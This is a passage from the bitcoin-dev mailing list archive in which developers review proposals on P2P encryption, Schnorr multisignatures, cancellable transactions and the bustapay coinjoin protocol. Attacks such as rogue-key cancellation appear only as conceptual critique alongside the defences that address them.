Writing things in stone is a great way to never finish a protocol.
Right now we know we have new upcoming proposals for messages where
the overhead matters, e.g. we need a replacement addr message ASAP,
and there is ongoing work for transaction relay that would also
benefit from low overhead.

The norm in Bitcoin is to ignore messages you don't know how to parse
anyways,  so there is no complexity that arises from "may negotiate"
itself-- only from actually making use of that possibility in the
future, so the merits of any particular usage could be decided when
something wants to actually use it.  The purpose of pointing out "may
negotiate" is, I think, primarily to avoid a debate about who would
assign numbers from this limited space in the future-- and the answer
just is that they're implementation defined (e.g. by the BIPs using
them).

> necessary anyway, so maybe just use IDs for anything? ASCII is nice if you want to debug your code
> or some random network failure but that's hard anyway when encryption is used.

Right, encryption kills external analysers in any case. It's also easy
to just logprintf traffic (this is open source software after all),
which doesn't have a decoding problem.

>  - "The Re-Keying must be done after every 1GB of data sent or received" Hm, every peer updates its
>  own sending key, so this should just read "sent" instead of "sent or received"?

I think it says 'received there' mostly because it's implicitly
telling you that you can hang up on someone who violates it. I agree
it would be more consistent to express it sending side there.

From jonasdnick at gmail.com  Fri Sep  7 08:11:56 2018
From: jonasdnick at gmail.com (Jonas Nick)
Date: Fri, 7 Sep 2018 08:11:56 +0000
Subject: [bitcoin-dev] Multisignature for bip-schnorr
In-Reply-To: <CAHk9a9ct_h485MY4gk7S++FAu5FEH3PL9pd9mrrh+wA8nWaVUA@mail.gmail.com>
References: <CAHk9a9ct_h485MY4gk7S++FAu5FEH3PL9pd9mrrh+wA8nWaVUA@mail.gmail.com>
Message-ID: <80e4e9b8-0cf3-b99e-7ac3-87ebbd8bb97c@gmail.com>

Your multisignature writeup appears to be vulnerable to key cancellation
attacks because the aggregated public key is just the sum of public keys (and
there is no proof of knowledge of the individual secret keys). Therefore, in a
multisignature between Alice and an attacker, the attacker can choose their key
to be -alice_key+attacker_key resulting in an aggregated key for which the
attacker can sign alone (without requiring Alice's partial signature). The
Schnorr BIP links to the MuSig paper which describes a secure key aggregation
scheme. See https://eprint.iacr.org/2018/068

On 8/7/18 6:35 AM, nakagat via bitcoin-dev wrote:
> Hi all,
> 
> I wrote a multisignature procedure using bip-schnorr.
> 
> If you have time to review and give feedback, I?d really appreciate it.
> Thanks in advance!
> 
> Multisignature
> https://gist.github.com/tnakagawa/0c3bc74a9a44bd26af9b9248dfbe598b
> 
> Original
> https://github.com/sipa/bips/blob/bip-schnorr/bip-schnorr.mediawiki#Multisignatures_and_Threshold_Signatures
> 

From sara.tucci at cea.fr  Fri Sep  7 13:47:17 2018
From: sara.tucci at cea.fr (TUCCI Sara)
Date: Fri, 7 Sep 2018 13:47:17 +0000
Subject: [bitcoin-dev] A BIP proposal for transactions that are
 'cancellable'
In-Reply-To: <20180907125135.GR62902@hank.reardencode.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
	<20180906203244.GQ62902@hank.reardencode.com>
	<caa38174-5bd9-74dd-deaa-3feb7a10822b@gmail.com>
	<20180907125135.GR62902@hank.reardencode.com>
Message-ID: <683F5209-BC5E-429C-8F8F-B21333D697A1@cea.fr>

Hello Gregory, all
  Thank you so much for your feedback. Our main objective in the research paper was in fact to study the "what-if" situation in which Bitcoin offered the cancellation of the transaction from the user's point of view. Our main interest was the model of the user-agents and quantify the possible "satisfaction" that the user can obtain while also quantifying a possible greater satisfaction with the respect to the current situation. When we wrote the document, we thought about the "implementability" of the cancellation through non-monotonous validity to obtain a more realistic model, but being very cautious in proposing or claiming any kind of mechanism. Of course we never thought that nobody ever proposed it before, that's why when we finished writing the paper, many questions remained unanswered and we decided to send you the document, to get your opinion, which is very useful for improving  the current model.
Although Bitcoin will never implement the mechanism because arguments for non-monotonous validity use case will not emerge, I think this type of study can be useful to conclude on that opportunity or as Brandon suggested to move to other approaches, like Lightning (even though even for Lightning several limitations still there exist !). 

Sara

P.S.
Sorry for possible multiple copies of the message, I needed to subscribe to the mailing list and to repost __

?On 07/09/2018, 14:51, "Brandon Smith" <freedom at reardencode.com> wrote:

    I believe you may be missing the overall points in the "Nail In the
    Coffin" and "Temporary Discussion" sections. In summary:
    
    1: Any UTXO spending a script with an expiration must be treated
    similarly to Coinbase (I proposed a solution to this, but it's complex
    and may have unforeseen implications).
    
    2: All existing software assumes that a transaction once valid stays
    valid. Any proposal to change this must ensure that existing wallets and
    users aren't immediately open to being scammed by malicious actors
    sending low fee expiring transactions.
    
    The more tenable ways to move forward on improving the ecosystem around
    delayed transactions and refunds are: Lightning, improved fee
    estimation, and improved mempool eviction / re-propagation resistance.
    
    The original reason that I began looking into this is because I noticed
    that during high fee periods, transactions could re-propagate between
    mempools of differing policies resulting in coins being stuck unusable
    for far longer than the expected 1-2 week eviction. I don't know of any
    concrete work going into investigating or improving this.
    
    HTH,
    
    --Brandon
    
    On 2018-09-07 (Fri) at 09:12:40 +0200, Alejandro Ranchal Pedrosa wrote:
    > Hi all,
    > 
    > Thank you for the link, and also to Gregory for the remarks. I did not 
    > know about this previous proposal. I think the last paragraph of future 
    > work is interesting:
    > 
    > "It may be interesting to add enhance OP_CHECKSEQUENCEVERIFY 
    > <https://github.com/bitcoin/bips/blob/master/bip-0112.mediawiki> to 
    > allow outputs that are spendable by Alice until time foo, always 
    > spendable by Bob, and spendable by Joe only after time bar, or other 
    > such cases"
    > 
    > Perhaps it would allow this functionality, while keeping the validity of 
    > coins, if the new OP_zzz took an additional argument than suggested, 
    > such that the first one is the timelimit for Alice to keep the coin (say 
    > in the first 24 hours), and after those 24 hours the ownership goes to 
    > the third argument, say Bob.
    > 
    > That is, it is not possible to use only specifying the owner in the 
    > first 24 hours. Would this be considered harmful?
    > 
    > Best,
    > 
    > Alejandro.
    > 
    > On 9/6/18 10:32 PM, Brandon Smith wrote:
    > > ade a similar proposal about 7 months ago, and documented some of the
    > > discussion points here:
    


From sjors at sprovoost.nl  Mon Sep 10 12:30:46 2018
From: sjors at sprovoost.nl (Sjors Provoost)
Date: Mon, 10 Sep 2018 14:30:46 +0200
Subject: [bitcoin-dev] bustapay BIP :: a practical sender/receiver
 coinjoin protocol
In-Reply-To: <TtjH2zicjKr8PBVCMOvA7ryt2z_XXvtrpC4y1wuWSxexNwMdbPGE7vPmu6UnzmfYqYBMxZ8NNoz4VUnODdIcjR4j-E1sYz_FA6ZZMjKHtuM=@protonmail.com>
References: <TtjH2zicjKr8PBVCMOvA7ryt2z_XXvtrpC4y1wuWSxexNwMdbPGE7vPmu6UnzmfYqYBMxZ8NNoz4VUnODdIcjR4j-E1sYz_FA6ZZMjKHtuM=@protonmail.com>
Message-ID: <82F5C582-1B93-44CF-B5AA-A93AAEA32AB2@sprovoost.nl>


> Op 30 aug. 2018, om 22:24 heeft Ryan Havar via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> het volgende geschreven:
> 
> ==Motivation==
> 
> One of the most powerful heuristic's employed by those whose goal is to undermine
> bitcoin's fungiblity has been to assume all inputs of a transaction are signed by
> a single party. In the few cases this assumption does not hold, it is generally
> readibly recognizable (e.g. traditional coinjoins have a very obvious structure,
> or multisig outputs are most frequently validated onchain).

In addition to mixers, custodial wallets and exchanges also contribute to breaking this heuristic; even though there?s a single entity signing multiple inputs, that entity doesn?t represent a single owner of the funds. As with mixers, exchanges and custodial wallets can sometimes be spotted as well, but we don?t know what percentage is missed.

Breaking this heuristic at scale would be good, but do we know to what degree it?s already broken? Is there any empirical research measuring its accuracy and false positive rate?

> Should bustapay enjoy widespread adoption, a "v2" specification
> will be created with desired extensions.

I would not put future promises in a BIP. Rather, explain how extension might work.

> ==Specification==
> 
> A bustapay payment is made from a sender to a receiver.
> 
> Step 1. Sender creates a bitcoin transaction paying the receiver
> 
> This transaction must be fully valid, signed and all inputs must use segwit. This transaction is known as the "template transaction?.

Using PSBT?

> This transaction must not be propagated on the bitcoin network.

This can?t be guaranteed, and even after step 5 a reorg could cause it to get confirmed. It?s useful to explain why this doesn?t matter.

> 
> Step 2. Sender gives the "template transaction" to the receiver
> 
> This would generally be done as an HTTP POST.
> The exact URL to submit it to could be specified with a bip21 encoded address. Such as bitcoin:2NABbUr9yeRCp1oUCtVmgJF8HGRCo3ifpTT?bustapay=https://bp.bustabit.com/submit <https://bp.bustabit.com/submit> and the HTTP body should be the raw transaction hex encoded as text.

This seems too detailed. If you want to specify the message protocol, maybe that can have it?s own section where you list each of the messages, the URL, parameters and encoding. Then you can keep this overview section shorter.

The use of HTTPS kind of forces sender and recipient to use a 3rd party service, even though this could done bilaterally. What if the payment request contained a (single-use) Onion URL an expiration date? The recipient would have to keep a hidden service up until the expiration date, though the sender could try again if there?s temporary reachability issue.

Adding a (onion) URL to the the payment request also makes gradual adoption easier, because recipients don?t need to worry if senders support this protocol.

> Step 3. Receiver processes the transaction and returns a partially signed coinjoin
> 
> The receiver validates the transaction is valid, pays himself and is eligible for propation. The receiver then adds one of his own inputs (known as the "contributed input") and increase the output that pays himself by the contributed input amount. Doing so will invalidate the "template transaction"'s original input signatures, so the sender needs to return this "partial transaction" back to the receiver to sign. This is returned as a hex-encoded raw transaction a response to the original HTTP POST request.

> * Bustapay could be abused by a malicious party to query if you own a deposit address or not. So never accept a bustapay transaction that pays an already used deposit address


Indeed, once the recipient adds funds, they reveal more about themselves to the sender then they would otherwise. I think that needs more elaboration.

I assume the transaction in step (1) is some sort of collateral to insure they?re not just trying to extract private information from you? However if fees are low they could still double-spend it after the recipient revealed their address, especially because the recipient has no way of RBF?ing the original (though CPFP could help). Perhaps require that the original transaction pays a fee based on the expected size of the final transaction?

> 
> Notes for sending applications:
> 
> * The HTTP response must *not* be trusted. It should be fully validated that no unexpected changes have been made to the transaction.

Not trusting anything is obvious. :-) It?s better to explicitly state what exactly needs to be verified (amounts, destinations, inputs, etc), and maybe list a few obvious shenanigans to watch out for.

A more general concern is that the sender can?t know for sure the recipient really supports this protocol, so it should assume that whatever information it pings to some API could be used maliciously. In what ways could it be abused?

Sjors
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180910/d1d40a7e/attachment.html>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 833 bytes
Desc: Message signed with OpenPGP
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180910/d1d40a7e/attachment.sig>

From rhavar at protonmail.com  Mon Sep 10 15:49:29 2018
From: rhavar at protonmail.com (rhavar at protonmail.com)
Date: Mon, 10 Sep 2018 15:49:29 +0000
Subject: [bitcoin-dev] bustapay BIP :: a practical sender/receiver
	coinjoin protocol
In-Reply-To: <82F5C582-1B93-44CF-B5AA-A93AAEA32AB2@sprovoost.nl>
References: <TtjH2zicjKr8PBVCMOvA7ryt2z_XXvtrpC4y1wuWSxexNwMdbPGE7vPmu6UnzmfYqYBMxZ8NNoz4VUnODdIcjR4j-E1sYz_FA6ZZMjKHtuM=@protonmail.com>
	<82F5C582-1B93-44CF-B5AA-A93AAEA32AB2@sprovoost.nl>
Message-ID: <_EzN510Ay5ho4Qld2nJcvFBDSh03Su2Abcw7htqWHQkEPwV1v-Ut8-ta3OBslpsIXtto_CUbWCCMhs489z1PsI3jDWJRvstIbvh3qTFomPk=@protonmail.com>

Thanks Sjors,
It's nice to get hear feedback like that, it'll help make me clear some stuff up. Right now I've been working on getting a reference client for both sending and receiving, while juggling some stuff in real life.

But here is the evolving document:
https://github.com/RHavar/bips/blob/master/bip-bustapay.mediawiki

> Breaking this heuristic at scale would be good, but do we know to what degree it?s already broken? Is there any empirical research measuring its accuracy and false positive rate?

Not that I'm aware of. However from what I've seen of chainalysis, it's eerily accurate. I've seen it cluster wallets that it really shouldn't have been able to do. (address-reuse is actually the biggest culprit here, we really need to working on reducing stopping this with stuff like bip32 based address books, wallet warnings on reused addresses, etc.). As for false positives of block-chain analysis, under normal circumstances it probably shouldn't suffer any. Although it was pretty easy to confuse it with specially crafted coinjoin transactions, although a few months later seemed to realize and decluster the wallets again.

> In addition to mixers, custodial wallets and exchanges also contribute to breaking this heuristic

Well, kind of I guess. From a block-chain analysis point of view you'd be trying to figure out the transaction was to/from coinbase, rather than "coinbase on behalf of client XYZ". I guess the former is better than the later, but I think it'd be preferable if no one knew all together.

> Using PSBT?

I've got this feedback a lot, and I think it's definitely the way to go in the future. But at the moment compatibility and libraries are just not there that I'd like to stick with raw transactions for now.

> The use of HTTPS kind of forces sender and recipient to use a 3rd party service, even though this could done bilaterally.

I don't really understand this point. I just used https as an example, as I suspect that's what every merchant will want to use. I don't really mean to specify the protocol though, if the client/server support  it (e.g. onion)  then it should be fine.

> I assume the transaction in step (1) is some sort of collateral to insure they?re not just trying to extract private information from you?

It's not really designed as a sort of collateral, but as a way to prevent someone costlessly learning about one of your inputs. The cost is that of spending a utxo. An attacker can always trivially double spend the "template transaction" because from the network's point of view the "template transaction" will come after an alternate (say, non-rbf) spend.  But in practice I don't think this is a problem, because it still imposes a cost on the attacker.

> In what ways could it be abused?

I just want to make it clear that senders can't blindly sign a transaction without verifying it. The most important thing to verify is the output amounts/addresses -- but I will make it more explicit.

Thanks once again for your feedback

-Ryan

??????? Original Message ???????
On Monday, 10 September 2018 05:30, Sjors Provoost <sjors at sprovoost.nl> wrote:

>> Op 30 aug. 2018, om 22:24 heeft Ryan Havar via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> het volgende geschreven:
>>
>> ==Motivation==
>>
>> One of the most powerful heuristic's employed by those whose goal is to undermine
>> bitcoin's fungiblity has been to assume all inputs of a transaction are signed by
>> a single party. In the few cases this assumption does not hold, it is generally
>> readibly recognizable (e.g. traditional coinjoins have a very obvious structure,
>> or multisig outputs are most frequently validated onchain).
>
> In addition to mixers, custodial wallets and exchanges also contribute to breaking this heuristic; even though there?s a single entity signing multiple inputs, that entity doesn?t represent a single owner of the funds. As with mixers, exchanges and custodial wallets can sometimes be spotted as well, but we don?t know what percentage is missed.
>
> Breaking this heuristic at scale would be good, but do we know to what degree it?s already broken? Is there any empirical research measuring its accuracy and false positive rate?
>
>> Should bustapay enjoy widespread adoption, a "v2" specification
>> will be created with desired extensions.
>
> I would not put future promises in a BIP. Rather, explain how extension might work.
>
>> ==Specification==
>>
>> A bustapay payment is made from a sender to a receiver.
>>
>> Step 1. Sender creates a bitcoin transaction paying the receiver
>>
>> This transaction must be fully valid, signed and all inputs must use segwit. This transaction is known as the "template transaction?.
>
> Using PSBT?
>
>> This transaction must not be propagated on the bitcoin network.
>
> This can?t be guaranteed, and even after step 5 a reorg could cause it to get confirmed. It?s useful to explain why this doesn?t matter.
>
>> Step 2. Sender gives the "template transaction" to the receiver
>>
>> This would generally be done as an HTTP POST.
>
>> The exact URL to submit it to could be specified with a bip21 encoded address. Such as bitcoin:2NABbUr9yeRCp1oUCtVmgJF8HGRCo3ifpTT?bustapay=https://bp.bustabit.com/submit and the HTTP body should be the raw transaction hex encoded as text.
>
> This seems too detailed. If you want to specify the message protocol, maybe that can have it?s own section where you list each of the messages, the URL, parameters and encoding. Then you can keep this overview section shorter.
>
> The use of HTTPS kind of forces sender and recipient to use a 3rd party service, even though this could done bilaterally. What if the payment request contained a (single-use) Onion URL an expiration date? The recipient would have to keep a hidden service up until the expiration date, though the sender could try again if there?s temporary reachability issue.
>
> Adding a (onion) URL to the the payment request also makes gradual adoption easier, because recipients don?t need to worry if senders support this protocol.
>
>> Step 3. Receiver processes the transaction and returns a partially signed coinjoin
>>
>> The receiver validates the transaction is valid, pays himself and is eligible for propation. The receiver then adds one of his own inputs (known as the "contributed input") and increase the output that pays himself by the contributed input amount. Doing so will invalidate the "template transaction"'s original input signatures, so the sender needs to return this "partial transaction" back to the receiver to sign. This is returned as a hex-encoded raw transaction a response to the original HTTP POST request.
>
>> * Bustapay could be abused by a malicious party to query if you own a deposit address or not. So never accept a bustapay transaction that pays an already used deposit address
>
> Indeed, once the recipient adds funds, they reveal more about themselves to the sender then they would otherwise. I think that needs more elaboration.
>
> I assume the transaction in step (1) is some sort of collateral to insure they?re not just trying to extract private information from you? However if fees are low they could still double-spend it after the recipient revealed their address, especially because the recipient has no way of RBF?ing the original (though CPFP could help). Perhaps require that the original transaction pays a fee based on the expected size of the final transaction?
>
>> Notes for sending applications:
>>
>> * The HTTP response must *not* be trusted. It should be fully validated that no unexpected changes have been made to the transaction.
>
> Not trusting anything is obvious. :-) It?s better to explicitly state what exactly needs to be verified (amounts, destinations, inputs, etc), and maybe list a few obvious shenanigans to watch out for.
>
> A more general concern is that the sender can?t know for sure the recipient really supports this protocol, so it should assume that whatever information it pings to some API could be used maliciously. In what ways could it be abused?
>
> Sjors
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180910/1a3909de/attachment-0001.html>

From damgaard.martin at gmail.com  Wed Sep 12 06:32:10 2018
From: damgaard.martin at gmail.com (damgaard.martin at gmail.com)
Date: Wed, 12 Sep 2018 08:32:10 +0200
Subject: [bitcoin-dev] Suggestion for a universal bitcoin value scale
In-Reply-To: <CALJw2w7GZ=MXO8jMdObznqB8RndUjLOSRW-dFcQPsFLXeGsyLQ@mail.gmail.com>
References: <5b787d19.1c69fb81.e0628.771a@mx.google.com>
	<CALJw2w7GZ=MXO8jMdObznqB8RndUjLOSRW-dFcQPsFLXeGsyLQ@mail.gmail.com>
Message-ID: <5b98b2e7.1c69fb81.2a827.102b@mx.google.com>

A very good point. I have realized the immature nature of my suggestion due to this and a number of other good remarks, and will like to retract the initial suggestion.  
Thank you and all the best 
Martin Damgaard

Fra: Karl-Johan Alm
Sendt: 12. september 2018 08:14
Til: damgaard.martin at gmail.com; Bitcoin Protocol Discussion
Emne: Re: [bitcoin-dev] Suggestion for a universal bitcoin value scale

A potential problem is that it would be a new attack vector to simply
color something to appear as e.g. 10x more than it really is, if
everyone started using this system.
On Sun, Aug 19, 2018 at 5:27 AM Martin Damgaard via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
>
> Hi bitcoin-dev at lists.linuxfoundation.org
>
> Here is my humble attempt to make a contribution to the impressive work that you all are doing.
>
> I am unfamiliar with the normal BIP procedures. I have therefore just tried to follow the example of BIP 176 by Jimmy Song, in order make something similar. I suggest a universal bitcoin value color scale, for tackling the same decimal problem, as identified by the BIP 176 proposal.
>
> I have attached the document in three different formats (*.rtf, *.pdf and *.docx) as I do not know your preferred format. I hope you will find my suggestion useful.
>
>
>
> Thank you and all the best
>
> Martin Damgaard
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180912/8120c4fb/attachment.html>

From greg at xiph.org  Tue Sep 11 17:00:25 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Tue, 11 Sep 2018 17:00:25 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
Message-ID: <CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>

On Tue, Sep 11, 2018 at 4:34 PM Erik Aronesty <erik at q32.com> wrote:

> To answer points:
>
> - I switched to the medium article so that I could correct, edit and
> improve things to make them more clear.
> - I responded to feedback by modifying the protocol to make it work - not
> by ignoring it.
>

To this moment there remains no response at your post.
https://bitcointalk.org/index.php?topic=4973123.0

I'm not sure how I am supposted to have figured out that you wrote a
somewhat different repost of it elsewhere...

- An M-1 rogue-key attack would require the attacker would to either
>
>   - attack the hash function to produce a predictable R based on a known
> mesage
>   - attack the DLP to influence x or k
>
> Neither attack gives any particular advantage to someone who has M-1 keys.
>

You keep asserting this. It isn't true. Asserting it more does not make it
any more true.  I already explained how to attack this style of signature
(e.g. in the BCT thread).

Set aside your 'interpolation' for a moment, and imagine that you construct
a 2 of 2 signature by just adding the keys.  Your tell me your key, P1  and
then I tell you that my key P2 which I derived by computing -P1  + xG.   We
now compute P = P1 + P2 = P1 + -P1 + xG = xG ... and now in spite adding P1
with an unknown discrete log, I know the discrete log of P with respect to
G and I did not need to violate the standard DL security assumption to
achieve that.

With the 'interpolation' in effect the same attack applies but its
execution is somewhat more complex: instead of adding the negation of P1  I
must add a number of multiplicities of P1 (like P1*2, P1*3, P1*4...)
selected so that their interpolation coefficients add up to -1. Finding a
suitable subset requires solving a randomized modular subset sum problem
and Wagner's algorithm provides a computationally tractable solution to it.

The potential of rogue keys applies to both the keys themselves and to the
nonces. There are several ways to prevent these attacks, the musig paper
describes a delinearization technique which doesn't require additional
interaction or communication.

I haven't tested whether the R,s version is susceptible though.
>

There is a perfect bijection between the two encodings which is easily
computable, so they're the same thing from an abstract security perspective.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180911/6d4ebd71/attachment.html>

From greg at xiph.org  Tue Sep 11 17:27:09 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Tue, 11 Sep 2018 17:27:09 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
Message-ID: <CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>

On Tue, Sep 11, 2018 at 5:20 PM Erik Aronesty <erik at q32.com> wrote:
> The security advantages of a redistributable threshold system are huge.   If a system isn't redistributable, then a single lost or compromised key results in lost coins... meaning the system is essetntially unusable.
>
> I'm actually worried that Bitcoin releases a multisig that encourages loss.

There is no "non- edistributiable multisig" proposed for Bitcoin
anywhere that I am aware of.

From greg at xiph.org  Tue Sep 11 17:51:01 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Tue, 11 Sep 2018 17:51:01 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
	<CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
Message-ID: <CAAS2fgTRmsws4y7yz=584QXvjsVawY84je=jOEoXm2RK_jieXQ@mail.gmail.com>

On Tue, Sep 11, 2018 at 5:38 PM Erik Aronesty <erik at q32.com> wrote:
>
> - Musig, by being M of M, is inherently prone to loss.

M of M is a particular threshold.   If you want M of M (there are
plenty of cases where M of M _must_ be used) then you get the
consequences of M of M, which presumably you want.

This has nothing to do with musig.  If you want a threshold other than
M of M then you use a threshold other than M of M.

No one is under the impression that M of M is somehow a replacement
for other thresholds.  We've spent more time talking about M of M in
some writeups in the past because it's exactly the case you need for
signature aggregation in Bitcoin and because it's a simpler case to
explain.

> - Having the senders of the G*x pubkey shares sign their messages with the associated private key share should be sufficient to prevent them from using wagner's algorithm to attack the combined key.

Yes, that is one possibility which is described in the musig paper,
but it requires users communicate an extra signature per key.  So, for
example, if used with aggregate signature it would completely
eliminate the communications efficiency gains from aggregation, making
aggregation worse than pointless.  It also has somewhat worse failure
properties than delinearization, because a signer that fails to
validate other's share signatures behaves behaves exactly the same as
a correct one, on honest inputs.  That approach has its uses but I
think that in any case where delinearization can be used it's a better
option.

From erik at q32.com  Tue Sep 11 16:34:11 2018
From: erik at q32.com (Erik Aronesty)
Date: Tue, 11 Sep 2018 12:34:11 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
Message-ID: <CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>

 To answer points:

- I switched to the medium article so that I could correct, edit and
improve things to make them more clear.
- I responded to feedback by modifying the protocol to make it work - not
by ignoring it.
- I coded it up in python so I could be sure it worked, because I was
concerned that it was broken
- Yes, coding it up showed me that it's definitely interactive, and no
different than a "standard shnorr sig" in any meaningful way regarding the
security
- No special protocol support is needed over Schnorr signing itself.  The
e, s version can be made at least as secure as schnorr + DLP.  I haven't
researched the R,s version.
- An M-1 rogue-key attack would require the attacker would to either

  - attack the hash function to produce a predictable R based on a known
mesage
  - attack the DLP to influence x or k

Neither attack gives any particular advantage to someone who has M-1 keys.

I haven't tested whether the R,s version is susceptible though.


On Thu, Sep 6, 2018 at 9:15 AM Gregory Maxwell via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> On Wed, Sep 5, 2018 at 1:49 PM Erik Aronesty via bitcoin-dev
> <bitcoin-dev at lists.linuxfoundation.org> wrote:
> > Detailed explanation with code snippets:
> >
> > https://medium.com/@simulx/an-m-of-n-bitcoin-multisig-scheme-[snip]
>
> This appears to be a repost of the broken scheme you posted about on
> Bitcointalk, but then failed to respond to the response.
>
> https://bitcointalk.org/index.php?topic=4973123.0
>
> > The more I look into it and speak to professors about i, the more it
> seems "so trivial nobody really talks about it".
>
> I think you might be falling into the trap of ignoring feedback you
> don't like and and accepting that which sounds like "yea yea,
> something like that".
>
> Something "like that" does work: and is expressly and explicitly
> anticipated by the BIP but to be both secure and functional requires
> proper delineation (E.g. musig) _and_ interaction. What you're
> proposing is continually vague.  My best efforts at making sense of
> what you've written indicate that either it's non-interactive and
> not-actually functional at all,  OR it's interactive and just a less
> secure subset (no proper delinearization to prevent rogue key attacks)
> of what we already propose.
>
> When Poelstra suggests a CAS implementation he means something like
> this Sage notebook: http://bitcoin.ninja/secp256k1.ecdsa.sage  This
> provides for a method of communicating in both directions which is
> completely precise.
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
